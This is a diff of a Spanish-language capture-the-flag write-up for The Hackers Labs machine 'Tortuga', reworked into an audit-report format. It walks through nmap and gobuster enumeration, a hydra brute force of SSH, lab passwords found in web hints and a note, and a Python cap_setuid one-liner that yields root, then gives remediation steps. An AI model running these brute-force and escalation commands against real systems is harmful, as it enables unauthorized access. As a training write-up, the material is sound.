@@ -1,45 +1,30 @@
----
-🐢
----
+Informe Técnico de Auditoría: Máquina "Tortuga"
 
-# Tortuga
+Fecha: 11 de Diciembre, 2025 Plataforma: The Hackers Labs Objetivo: Comprometer el sistema, obtener acceso inicial (user.txt) y escalar privilegios hasta el administrador (root.txt). Clasificación: Boot2Root / CTF
+1. Resumen Ejecutivo
 
-## Tortuga&#x20;
+Durante la auditoría realizada a la máquina Tortuga (192.168.77.67), se identificaron vulnerabilidades críticas debidas a la exposición de información sensible y configuraciones inseguras de privilegios.
 
-**Entorno y contexto:**
+El vector de entrada principal fue la fuga de información (Information Leakage) en el servidor web, que reveló nombres de usuarios válidos. Esto permitió un ataque de fuerza bruta exitoso contra el servicio SSH. Posteriormente, se logró la escalada de privilegios horizontal mediante credenciales en texto plano encontradas en archivos locales, y finalmente una escalada vertical a root explotando una Capability de Linux mal configurada en el binario de Python.
+2. Fase de Reconocimiento y Enumeración
 
-**The Hackers Labs** ([https://labs.thehackerslabs.com](https://labs.thehackerslabs.com/machine/131))
+El primer paso consistió en identificar los servicios expuestos en la máquina objetivo para definir la superficie de ataque.
+2.1 Escaneo de Puertos (Nmap)
 
-Máquina objetivo: **192.168.77.67**.&#x20;
+Se utilizó nmap para descubrir puertos abiertos y versiones de servicios.
 
-Este documento recoge con detalle técnico, todo el proceso: descubrimiento, explotación, escalada y evidencias.
+Comando:
+Bash
 
-***
+nmap -sC -sV 192.168.77.67
 
-### Resumen ejecutivo
+    -sC: Ejecuta scripts por defecto (detecta vulnerabilidades comunes y configuraciones).
 
-* **Objetivo:** Obtener `user.txt` y `root.txt`.
-* **Resultados:** Acceso inicial por SSH como `grumete` (credencial obtenida por fuerza bruta) y escalada a `root` aprovechando `cap_setuid=ep` en `/usr/bin/python3.11`.
-* **Herramientas:** `nmap`, `gobuster`, `ffuf` (opcional), `hydra`, `ssh`, `getcap`, `python3.11`, `nc`, `curl`.
-* **Entorno de práctica:** VirtualBox + The Hackers Labs.
-* **Evidencias incluidas:** salidas de `nmap`, `gobuster`, contenidos de `/mapa.php` y `/tripulacion.php`, transcript SSH, scripts de explotación y flags (`user.txt`, `root.txt`).
+    -sV: Intenta determinar la versión del servicio.
 
-> Nota: este documento contiene artefactos reales del laboratorio. Si lo vas a publicar, revisa los apartados de `Evidencias` y considera redactar flags/credenciales si corresponde.
+Salida Obtenida:
+Bash
 
-***
-
-### 1) Reconocimiento — superficie de ataque
-
-Comando principal que ejecuté para reconocimiento inicial:
-
-```bash
-┌──(root㉿deox-kali)-[~]
-└─# nmap -sC -sV 192.168.77.67
-```
-
-Salida relevante (extracto):
-
-```bash
 Nmap scan report for 192.168.77.67
 Host is up (0.00011s latency).
 PORT   STATE SERVICE VERSION
@@ -47,257 +32,177 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.62 ((Debian))
 MAC Address: 08:00:27:07:CD:5C (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
 
-**Análisis:** la máquina expone SSH y HTTP. El servicio HTTP presentaba contenido estático/ dinámico con posibles pistas; esto sugiere que debemos realizar enumeración web dirigida antes de ataques indiscriminados.
+    Análisis: La máquina expone un servidor web (Apache) en el puerto 80 y un servicio de acceso remoto (SSH) en el puerto 22. La estrategia a seguir es investigar la web en busca de vulnerabilidades o información que nos permita atacar el SSH.
 
-***
+2.2 Enumeración Web (Fuzzing)
 
-### 2) Enumeración web — discovery y correlación de pistas
+Dado que el puerto 80 estaba abierto, se procedió a enumerar directorios y archivos ocultos utilizando gobuster. Esta técnica ayuda a encontrar paneles de administración, archivos de configuración o pistas olvidadas por los desarrolladores.
 
-Ejecuté un barrido de directorios con `gobuster` para identificar endpoints y archivos potencialmente sensibles:
+Comando:
+Bash
 
-```bash
-┌──(root㉿deox-kali)-[~]
-└─# gobuster dir -u http://192.168.77.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o scans/gobuster-tortuga.txt
-```
+gobuster dir -u http://192.168.77.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o scans/gobuster-tortuga.txt
 
-Salida relevante (extracto):
+Salida Relevante:
+Plaintext
 
-```bash
 /index.html           (Status: 200) [Size: 1440]
 /mapa.php             (Status: 200) [Size: 922]
+/tripulacion.php      (Status: 200)
 /server-status        (Status: 403) [Size: 278]
-Additional page discovered: /tripulacion.php (manual discovery)
-```
 
-#### Contenido de `/mapa.php`
+2.3 Análisis de Fuga de Información (OSINT Local)
 
-```html
-<!DOCTYPE html>
-<html lang="es">
-<head><meta charset="UTF-8"><title>Mapa</title></head>
-<body>
-    <h1>Mapa de Isla Tortuga</h1>
-    <pre>
-~~~~~~~~~~~~~~~~~~~
-~     PIRATE BAY   ~
-~~~~~~~~~~~~~~~~~~~
-       |   |
-       |   |    X  (tesoro enterrado)
-       |   |
-~~~~~~~~~~~~~~~~~~~
-~     PUERTO       ~
-~~~~~~~~~~~~~~~~~~~
-    </pre>
-    <p><i>Una nota arrugada se lee en la esquina del mapa...</i></p>
-    <p>"Ey <b>grumete</b> revisa la nota oculta que dejado en tu camarote..."</p>
-</body>
-</html>
-```
+Al inspeccionar manualmente los archivos descubiertos, encontramos información crítica filtrada en el código y el contenido visible.
 
-**Observación técnica:** el archivo incluye una referencia explícita al término `grumete`, que puede ser un nombre de usuario. En ejercicios de pentesting ofensivo, este tipo de información en contenido público reduce la entropía del objetivo y facilita ataques dirigidos de credenciales.
+Archivo /mapa.php: Contenía un mapa ASCII y un mensaje directo:
 
-#### Contenido de `/tripulacion.php`
+    "Ey grumete revisa la nota oculta que dejado en tu camarote..."
 
-```html
-<!DOCTYPE html>
-<html lang="es">
-<head><meta charset="UTF-8"><title>Tripulación</title></head>
-<body>
-    <h1>La Tripulación de Tortuga</h1>
-    <ul>
-        <li><b>Capitán Barbanegra</b> – Estratega implacable.</li>
-        <li><b>Corsario Rojo</b> – Maestro de la espada.</li>
-        <li><b>Grumete Verde</b> – Aprendiz despistado.</li>
-        <li><b>Timón de Hierro</b> – El que nunca pierde el rumbo.</li>
-    </ul>
-    <p><i>"Quien domine el timón hallará el rumbo a la victoria..."</i></p>
-    <p><i>"Recuerda: el viejo truco de las rutas dobles siempre funciona..."</i></p>
-</body>
-</html>
-```
+Archivo /tripulacion.php: Listaba posibles roles y usuarios:
 
-**Análisis:** la página confirma términos relacionados a usuarios (Grumete/Timón) y aporta la sugerencia "rutas dobles" que puede interpretarse como una pista para probar rutas con dobles barras `//` o versiones de directorios con sufijos/extensions. Toda pista textual debe registrarse y correlacionarse con diferentes vectores (nombres de usuario, rutas, parámetros).
+    Capitán Barbanegra
 
-***
+    Grumete Verde
 
-### 3) Ataque dirigido a autenticación — fuerza bruta
+    Timón de Hierro
 
-Con la hipótesis de que exista un usuario `grumete`, lancé un ataque de diccionario controlado contra SSH, registrando la salida para auditoría:
+    Insight Profesional: En ciberseguridad, esto se conoce como reducción de la entropía. En lugar de atacar con miles de usuarios genéricos (admin, root, user), ahora podemos enfocar nuestros ataques a un usuario específico confirmado: grumete.
 
-```bash
-┌──(root㉿deox-kali)-[~]
-└─# hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://192.168.77.67 -t 4 -o scans/hydra-ssh-tortuga.txt
-```
+3. Fase de Explotación (Acceso Inicial)
 
-Resultado (extracto):
+Con el usuario grumete confirmado, la hipótesis de ataque fue que este usuario podría tener una contraseña débil, algo común en entornos de prueba o usuarios con bajos privilegios.
+3.1 Ataque de Fuerza Bruta (Hydra)
 
-```bash
-Hydra output (abridged)
-Target: ssh://192.168.77.67:22
+Se utilizó hydra para probar contraseñas contra el servicio SSH.
+
+Comando:
+Bash
+
+hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://192.168.77.67 -t 4 -o scans/hydra-ssh-tortuga.txt
+
+Resultado Exitoso:
+Plaintext
+
 [22][ssh] host: 192.168.77.67   login: grumete   password: 1234
-1 valid password found
-```
 
-**Riesgo y ética:** este tipo de pruebas deben realizarse en entornos autorizados. En producción, la presencia de credenciales débiles y la exposición de nombres de usuario en áreas públicas incrementan significativamente el riesgo.
+3.2 Acceso SSH
 
-***
+Con las credenciales obtenidas (grumete:1234), accedemos al sistema.
 
-### 4) Acceso inicial y enumeración local
+Comando:
+Bash
 
-Tras obtener la credencial, establecí sesión SSH con `grumete` y procedí a la enumeración mínima necesaria para identificar vectores de escalada:
-
-```bash
-┌──(root㉿deox-kali)-[~]
-└─# ssh grumete@192.168.77.67
-# (usar la credencial detectada [1234])
-grumete@TheHackersLabs-Tortuga:~$ cat 
-.bash_history   .bashrc        .nota.txt      .profile       user.txt       
-grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt
-grumete@TheHackersLabs-Tortuga:~$ cat user.txt
-############################
-```
-
-Extracto de `.nota.txt`:
-
-<pre class="language-bash"><code class="lang-bash"><strong>grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt
-</strong>Querido grumete,
-
-Parto rumbo a la isla vecina por asuntos que no pueden esperar, estaré fuera un par de días. 
-Mientras tanto, confío en ti para que cuides del barco y de la tripulación como si fueran míos. 
-
-La puerta de la cámara del timón está asegurada con la contraseña: 
-    "mar_de_fuego123"  
-
-Recuerda, no se la reveles a nadie más. Has demostrado ser leal y firme durante todos estos años 
-navegando juntos, y eres en quien más confío en estos mares traicioneros.
-
-Mantén la guardia alta, vigila las provisiones y cuida de que ningún intruso ponga un pie en cubierta.  
-Cuando regrese, espero encontrar el barco tal y como lo dejo hoy (¡y nada de usar la bodega de ron 
-para hacer carreras de tortugas otra vez!).  
-
-Con la confianza de siempre,  
-— El Capitán
-</code></pre>
-
-**Observación:** la nota contiene una contraseña (`mar_de_fuego123`) para un recurso local denominado "cámara del timón" — esto confirma el patrón de pistas entre el contenido web y recursos locales. Guardé `user.txt` como evidencia para el informe.
-
-***
-
-### 5) Búsqueda de vectores de escalada — capacidades y SUIDs
-
-Accedemos al perfil del capitan:
-
-```bash
-┌──(root㉿deox-kali)-[~]
-└─# ssh capitan@192.168.77.67
-# (usar la credencial detectada [mar_de_fuego123])
-capitan@TheHackersLabs-Tortuga:~$ ls -la
-total 24
-drwxr-xr-x 2 capitan capitan 4096 sep  5 14:30 .
-drwxr-xr-x 4 root    root    4096 sep  5 11:49 ..
-lrwxrwxrwx 1 root    root       9 sep  5 11:59 .bash_history -> /dev/null
--rw-r--r-- 1 capitan capitan  220 abr 23  2023 .bash_logout
--rw-r--r-- 1 capitan capitan 3597 sep  5 14:23 .bashrc
--rw-r--r-- 1 capitan capitan  807 abr 23  2023 .profile
--rw------- 1 root    capitan   18 sep  5 14:30 .python_history
-```
-
-En el perfil del capitan no habia nada excepto un `.python_history` lo cual mas adelante usaremos para escalar a `root`.
-
-Busqué binarios con capabilities y SUID/SGID para identificar vectores explotables:
-
-<pre class="language-bash"><code class="lang-bash"><strong>capitan@TheHackersLabs-Tortuga:~$ getcap -r / 2>/dev/null
-</strong># y búsqueda de SUIDs si procede (find / -perm -4000 ...)
-</code></pre>
-
-Salida relevante observada:
-
-```
-/usr/bin/ping cap_net_raw=ep
-/usr/bin/python3.11 cap_setuid=ep
-```
-
-**Interpretación técnica:** la presencia de `cap_setuid=ep` en `/usr/bin/python3.11` indica que dicho binario puede modificar UID efectivos si es invocado por un proceso con la capacidad asociada. Esto es un vector de elevación de privilegios crítico cuando se asigna a un intérprete general como Python.
-
-***
-
-### 6) Explotación del vector — escalada a root
-
-Con control local, usé Python para invocar `os.setuid(0)` y lanzar una shell con UID 0:
-
-<pre class="language-bash"><code class="lang-bash"><strong>capitan@TheHackersLabs-Tortuga:~$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-</strong></code></pre>
-
-Comprobación inmediata:
-
-<pre class="language-bash"><code class="lang-bash">root@TheHackersLabs-Tortuga:~# whoami
-root
-<strong>root@TheHackersLabs-Tortuga:~# cd /root 
-</strong>root@TheHackersLabs-Tortuga:/root# cat root.txt
-############################
-</code></pre>
-
-**Riesgo crítico:** otorgar capacidades que permiten cambios de UID a intérpretes capaces de ejecutar código arbitrario (Python, Perl, etc.) es una mala práctica severa. En entornos productivos puede equivaler a una ruta de RCE → root en segundos.
-
-***
-
-### 7) Análisis técnico extendido
-
-#### 7.1 Vectores y ataque de superficie
-
-* **Exposición de información sensible en contenido web:** El inclusion de nombres de usuarios o pistas en HTML reduce la seguridad por 'information leakage'. Un adversario puede prioritizar usuarios para ataques de fuerza bruta y phishing.
-* **Credenciales débiles:** contraseñas como `1234` en un laboratorio ejemplifican un fallo de seguridad común; en producción, requiere políticas de contraseñas y autenticación fuerte.
-* **Capabilities mal aplicadas:** conceder `cap_setuid` a un intérprete ofrece una ruta de escalada de privilegios inmediata. Las policies de capabilities deben ser restrictivas y auditadas con frecuencia.
-
-#### 7.2 Remediación técnica recomendada (priorizada)
-
-1. **Eliminar capabilities innecesarias** de intérpretes y binarios de propósito general:
-
-```bash
-# Auditar primero, luego:
-sudo setcap -r /usr/bin/python3.11
-```
-
-2. **Forzar autenticación por clave pública** en SSH y deshabilitar autenticación por contraseña:
-
-```bash
-# /etc/ssh/sshd_config
-PasswordAuthentication no
-ChallengeResponseAuthentication no
-PermitRootLogin no
-```
-
-3. **Retirar pistas públicas** y cualquier dato identificador de usuarios en contenido web. Usar mecanismos de acceso autenticado para áreas que contengan información operativa.
-4. **Monitoreo y detección**: desplegar reglas en EDR/Host IDS que alerten sobre uso de binarios con capabilities (invocaciones a /usr/bin/python3.11 con setuid, llamadas a setuid, etc.).
-5. **Políticas de hardening y revisión periódica** (SUIDs, capabilities, sudoers, paquetes desactualizados).
-
-***
-
-### 8) Reproducibilidad — comandos clave
-
-```bash
-# Recon
-nmap -sC -sV 192.168.77.67
-
-# Enumeración web
-gobuster dir -u http://192.168.77.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
-
-# Fuerza bruta dirigida (solo en laboratorio autorizado)
-hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://192.168.77.67 -t 4 -o scans/hydra-ssh.txt
-
-# Acceso por SSH (ejemplo)
 ssh grumete@192.168.77.67
 
-# Enumeración local
+Una vez dentro, listamos los archivos y encontramos la primera bandera (user.txt) y una nota oculta.
+
+Evidencia (user.txt):
+Bash
+
+grumete@TheHackersLabs-Tortuga:~$ cat user.txt
+############################
+
+4. Movimiento Lateral (Escalada Horizontal)
+
+A menudo, el primer usuario comprometido no tiene privilegios suficientes. El siguiente paso es buscar cómo moverse a otro usuario con más poder.
+4.1 Análisis de Archivos Locales
+
+En el directorio del usuario grumete, encontramos un archivo oculto llamado .nota.txt.
+
+Contenido de .nota.txt:
+Plaintext
+
+Querido grumete,
+...
+La puerta de la cámara del timón está asegurada con la contraseña: 
+    "mar_de_fuego123"  
+...
+— El Capitán
+
+Esta nota revela una contraseña en texto claro (mar_de_fuego123) asociada al "Capitán" o la "cámara del timón".
+4.2 Cambio de Usuario
+
+Probamos esta contraseña para cambiar al usuario capitan.
+
+Comando:
+Bash
+
+su capitan
+# Contraseña: mar_de_fuego123
+
+O conectando directamente por SSH:
+Bash
+
+ssh capitan@192.168.77.67
+
+Validación de acceso:
+Bash
+
+capitan@TheHackersLabs-Tortuga:~$ whoami
+capitan
+
+5. Escalada de Privilegios (Root)
+
+Ahora, como usuario capitan, el objetivo es obtener control total (root).
+5.1 Enumeración de Capabilities
+
+En Linux, las Capabilities permiten a un binario realizar acciones de superusuario sin ser setuid root completo. Buscamos binarios con capacidades peligrosas usando getcap.
+
+Comando:
+Bash
+
 getcap -r / 2>/dev/null
-# (opcional) find / -perm -4000 -type f 2>/dev/null
 
-# Escalada (si python tiene cap_setuid=ep)
+    -r: Búsqueda recursiva.
+
+    2>/dev/null: Oculta errores de permisos.
+
+Salida Crítica:
+Plaintext
+
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/python3.11 cap_setuid=ep
+
+    Explicación Técnica: La capacidad cap_setuid=ep en /usr/bin/python3.11 es extremadamente peligrosa. Significa que el binario de Python tiene permiso para manipular su propio Identificador de Usuario (UID). Un atacante puede invocar Python y decirle que cambie su UID a 0 (root).
+
+5.2 Explotación de Python Capability
+
+Creamos un pequeño script en una sola línea (one-liner) que importa la librería del sistema operativo, cambia el ID del usuario a 0 (root) y lanza una nueva terminal.
+
+Comando de Explotación:
+Bash
+
 /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-```
 
-***
+5.3 Confirmación de Root
 
-_Documento generado y compilado por deox420 durante la práctica en The Hackers Labs._
+Al ejecutar el comando, el prompt cambia, indicando que somos el superusuario.
+
+Salida:
+Bash
+
+root@TheHackersLabs-Tortuga:~# whoami
+root
+root@TheHackersLabs-Tortuga:~# cd /root
+root@TheHackersLabs-Tortuga:/root# cat root.txt
+############################
+
+6. Recomendaciones y Remediación
+
+Como parte del informe profesional, se sugieren las siguientes acciones para asegurar el sistema:
+
+    Limpiar Metadatos Web: Eliminar cualquier referencia a nombres de usuarios reales (grumete) o pistas operativas en el código HTML público (/mapa.php, /tripulacion.php).
+
+    Fortalecer Autenticación:
+
+        Cambiar la contraseña débil del usuario grumete (1234).
+
+        Deshabilitar el acceso por contraseña en SSH y usar solo claves pública/privada.
+
+    Gestión de Secretos: Nunca almacenar contraseñas en archivos de texto plano como .nota.txt. Usar gestores de contraseñas o variables de entorno seguras.
+
+    Principio de Mínimo Privilegio: Eliminar la capability cap_setuid del binario de Python, ya que no es necesaria para su funcionamiento normal y representa un riesgo crítico.
+
+        Comando de corrección: setcap -r /usr/bin/python3.11
